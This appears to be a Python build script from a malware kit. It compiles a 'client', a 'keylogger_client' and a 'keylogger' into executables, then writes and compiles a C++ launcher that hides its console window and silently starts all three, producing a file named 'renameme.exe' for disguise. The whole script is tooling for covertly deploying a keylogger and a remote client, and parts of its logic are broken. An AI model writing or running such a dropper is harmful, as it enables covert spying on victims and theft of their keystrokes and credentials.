import os
import sys
import time
print("[*] Compiling . . .")
nameof = input("[*] Enter the name of the file(the client): ")
nameof__ = input("[*] Enter the name of the file(the keylogger_client): ")
nameof_ = input("[*] Enter the name of the file(the keylogger): ")
if '.py' in nameof:
	backwards = nameof[:-3]
elif '.exe' in nameof:
	backwards = nameof[:-4]
	#print(backwards)
if '.exe' in nameof_:
	backwards_2 = nameof_[:-4]
if '.py' in nameof__:
	backwards_3 = nameof__[:-3]
csrf = f"{backwards}.py"
os.system(f"pyinstaller --onefile {csrf}")
os.system(f"pyinstaller --onefile {backwards_3}.py")
print("[*] Done . .")
print("[*] The initializer CPP program . ..")
print("[*] Preparing . .")
filecpp = '''
#include <iostream>
#include <windows.h>
using namespace std;
void openint() {
	'''
filecpp += f'''system("{backwards}.exe");'''
filecpp += f'''system("{backwards_2}.exe");'''
filecpp += f'''system("{backwards_3}.exe");'''
filecpp += '''
}
int main() {
	HWND windowed;
	windowed = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(windowed, 0);
	openint();
}'''
xc = open("filecpp.cpp", 'w')
xc.write(filecpp)
xc.close()
print("[*] Compiling .. .")
command = f"g++ filecpp.cpp -o renameme.exe"
os.system(command)
def compile():
	zx = os.system("copy renameme.exe dist")
	zx = os.system(f"copy {backwards_2}.exe dist")
	if os.name == 'posix':
		return False
	if os.name == 'nt':
		if zx == 0:
			return True
	v = os.system(f"copy {backwards_3}.exe dist")
	if os.name == 'posix':
		return False 
	if os.name == 'nt':
		if zx == 0:
			return True
	print("[*] All things done!")
	print("[*] Everything is in directory DIST")
compile()